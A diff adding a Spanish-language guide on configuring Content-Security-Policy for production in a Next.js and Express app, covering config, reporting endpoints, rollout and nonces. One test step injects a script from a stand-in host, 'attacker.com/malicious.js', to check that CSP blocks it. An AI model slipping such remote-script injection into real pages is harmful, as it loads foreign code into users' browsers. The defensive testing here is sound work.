@@ -826,7 +826,337 @@ Permissions-Policy: geolocation=(), microphone=(), camera=()
 
 ---
 
-## 📚 Documentación Adicional
+## � Configuración de CSP en Producción
+
+### Paso 1: Revisar CSP Actual
+
+**Archivo:** `next.config.js:13-55`
+
+**CSP Actual (Desarrollo):**
+```javascript
+"default-src 'self'",
+"script-src 'self' 'unsafe-inline' 'unsafe-eval'",
+"style-src 'self' 'unsafe-inline'",
+"img-src 'self' data: https:",
+"font-src 'self' data:",
+"connect-src 'self' http://localhost:3001 http://localhost:3000 https:",
+```
+
+**Problema:** `'unsafe-inline'` y `'unsafe-eval'` son permitidos (menos seguro)
+
+---
+
+### Paso 2: Configurar CSP para Producción
+
+**Cambios necesarios:**
+
+```javascript
+// next.config.js
+
+async headers() {
+  const isDevelopment = process.env.NODE_ENV === 'development';
+  
+  return [
+    {
+      source: '/:path*',
+      headers: [
+        {
+          key: 'Content-Security-Policy',
+          value: isDevelopment
+            ? // Desarrollo: más permisivo
+              [
+                "default-src 'self'",
+                "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
+                "style-src 'self' 'unsafe-inline'",
+                "img-src 'self' data: https:",
+                "font-src 'self' data:",
+                "connect-src 'self' http://localhost:3001 http://localhost:3000 https:",
+                "frame-ancestors 'none'",
+                "base-uri 'self'",
+                "form-action 'self'",
+              ].join('; ')
+            : // Producción: máxima seguridad
+              [
+                "default-src 'self'",
+                "script-src 'self'", // SIN unsafe-inline ni unsafe-eval
+                "style-src 'self'",  // SIN unsafe-inline
+                "img-src 'self' data: https:",
+                "font-src 'self' data:",
+                "connect-src 'self' https://api.tudominio.com", // Solo tu API
+                "frame-ancestors 'none'",
+                "base-uri 'self'",
+                "form-action 'self'",
+                "upgrade-insecure-requests", // Fuerza HTTPS
+              ].join('; ')
+        },
+        // ... otros headers ...
+      ],
+    },
+  ];
+}
+```
+
+---
+
+### Paso 3: Configurar Variables de Entorno
+
+**Archivo:** `.env.production`
+
+```bash
+# API
+NEXT_PUBLIC_API_URL=https://api.tudominio.com/v1
+
+# CSP
+NEXT_PUBLIC_CSP_ENABLED=true
+```
+
+**Archivo:** `.env.development`
+
+```bash
+# API
+NEXT_PUBLIC_API_URL=http://localhost:3001/v1
+
+# CSP
+NEXT_PUBLIC_CSP_ENABLED=false
+```
+
+---
+
+### Paso 4: Actualizar Dominios en CSP
+
+**Reemplazar:**
+- `http://localhost:3001` → `https://api.tudominio.com`
+- `http://localhost:3000` → `https://tudominio.com`
+
+**Ejemplo para múltiples dominios:**
+```javascript
+"connect-src 'self' https://api.tudominio.com https://cdn.tudominio.com",
+```
+
+---
+
+### Paso 5: Habilitar HTTPS
+
+**Importante:** CSP `upgrade-insecure-requests` requiere HTTPS en producción
+
+**Configurar en tu servidor:**
+- Nginx, Apache, o tu hosting provider
+- Obtener certificado SSL (Let's Encrypt es gratis)
+- Redirigir HTTP → HTTPS
+
+---
+
+### Paso 6: Testing de CSP en Producción
+
+#### Test 1: Verificar Headers
+```bash
+curl -I https://tudominio.com
+
+# Debería mostrar:
+# Content-Security-Policy: default-src 'self'; script-src 'self'; ...
+```
+
+#### Test 2: Verificar que CSP Bloquea Scripts Maliciosos
+```javascript
+// Abrir DevTools (F12) en producción
+// Ejecutar en consola:
+const script = document.createElement('script');
+script.src = 'https://attacker.com/malicious.js';
+document.body.appendChild(script);
+
+// Debería ver error en consola:
+// Refused to load the script 'https://attacker.com/malicious.js' 
+// because it violates the Content Security Policy directive
+```
+
+#### Test 3: Verificar que Sitio Funciona
+```
+1. Ir a https://tudominio.com
+2. Verificar que todas las funciones funcionan
+3. Abrir DevTools (F12) → Console
+4. Verificar que NO hay errores de CSP
+```
+
+---
+
+### Paso 7: Monitorear CSP Violations
+
+**Agregar endpoint para reportar violaciones:**
+
+**Backend - `src/routes/csp.routes.ts`:**
+```typescript
+import { Router, Request, Response } from 'express';
+import { logger } from '../config/logger';
+
+const router = Router();
+
+router.post('/csp-report', (req: Request, res: Response) => {
+  const violation = req.body;
+  
+  logger.warn('CSP Violation', {
+    'document-uri': violation['document-uri'],
+    'violated-directive': violation['violated-directive'],
+    'effective-directive': violation['effective-directive'],
+    'original-policy': violation['original-policy'],
+    'blocked-uri': violation['blocked-uri'],
+    'source-file': violation['source-file'],
+    'line-number': violation['line-number'],
+    'column-number': violation['column-number'],
+    'disposition': violation['disposition'],
+  });
+  
+  res.status(204).send();
+});
+
+export default router;
+```
+
+**Frontend - `next.config.js`:**
+```javascript
+// Agregar a CSP:
+"report-uri https://tudominio.com/api/csp-report",
+
+// O usar report-to (más moderno):
+"report-to csp-endpoint",
+
+// Y agregar header:
+{
+  key: 'Report-To',
+  value: JSON.stringify({
+    group: 'csp-endpoint',
+    max_age: 10886400,
+    endpoints: [
+      { url: 'https://tudominio.com/api/csp-report' }
+    ]
+  })
+}
+```
+
+---
+
+### Paso 8: Gradual Rollout
+
+**Recomendación:** No cambiar CSP de golpe en producción
+
+**Estrategia:**
+
+1. **Semana 1:** Modo report-only (no bloquea, solo reporta)
+   ```javascript
+   "Content-Security-Policy-Report-Only: ..."
+   ```
+
+2. **Semana 2:** Revisar reportes de violaciones
+   - Identificar scripts legítimos que se bloquean
+   - Agregar dominios necesarios a whitelist
+
+3. **Semana 3:** Cambiar a modo enforcement (bloquea)
+   ```javascript
+   "Content-Security-Policy: ..."
+   ```
+
+---
+
+### Paso 9: Checklist de Producción
+
+- [ ] HTTPS habilitado en todos los dominios
+- [ ] CSP configurado con dominios correctos
+- [ ] Variables de entorno actualizadas
+- [ ] Testing de CSP en staging
+- [ ] Monitoreo de CSP violations configurado
+- [ ] Logs de CSP violations revisados
+- [ ] Rollout gradual completado
+- [ ] Team notificado de cambios
+- [ ] Documentación actualizada
+
+---
+
+### Paso 10: Troubleshooting
+
+#### Problema: Estilos no cargan
+**Causa:** `style-src 'self'` no permite inline styles
+
+**Solución:**
+```javascript
+// Opción 1: Permitir inline styles (menos seguro)
+"style-src 'self' 'unsafe-inline'",
+
+// Opción 2: Usar CSS externo (recomendado)
+// Mover todos los estilos a archivos .css
+```
+
+#### Problema: Fuentes no cargan
+**Causa:** `font-src` no incluye CDN de fuentes
+
+**Solución:**
+```javascript
+"font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com",
+```
+
+#### Problema: Scripts de terceros no cargan
+**Causa:** `script-src 'self'` no permite scripts externos
+
+**Solución:**
+```javascript
+// Agregar dominio específico
+"script-src 'self' https://cdn.ejemplo.com",
+
+// O usar nonce (más seguro)
+"script-src 'self' 'nonce-{random}'",
+```
+
+---
+
+### Paso 11: CSP Avanzado - Nonce
+
+**Para máxima seguridad, usar nonce:**
+
+**Backend:**
+```typescript
+import crypto from 'crypto';
+
+app.use((req, res, next) => {
+  const nonce = crypto.randomBytes(16).toString('hex');
+  res.locals.nonce = nonce;
+  
+  res.setHeader(
+    'Content-Security-Policy',
+    `script-src 'nonce-${nonce}' 'self'`
+  );
+  
+  next();
+});
+```
+
+**Frontend - Next.js:**
+```typescript
+// pages/_document.tsx
+export default function Document() {
+  const nonce = useContext(NonceContext);
+  
+  return (
+    <Html>
+      <Head>
+        <script nonce={nonce}>
+          {/* Código inline seguro */}
+        </script>
+      </Head>
+    </Html>
+  );
+}
+```
+
+---
+
+### Recursos Útiles
+
+- **CSP Validator:** https://csp-evaluator.withgoogle.com
+- **CSP Generator:** https://www.cspisawesome.com
+- **MDN CSP Guide:** https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+- **OWASP CSP Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
+
+---
+
+## �📚 Documentación Adicional
 
 Para más información, consulta:
 - `SECURITY_AUDIT_REPORT.md` - Casos de prueba detallados
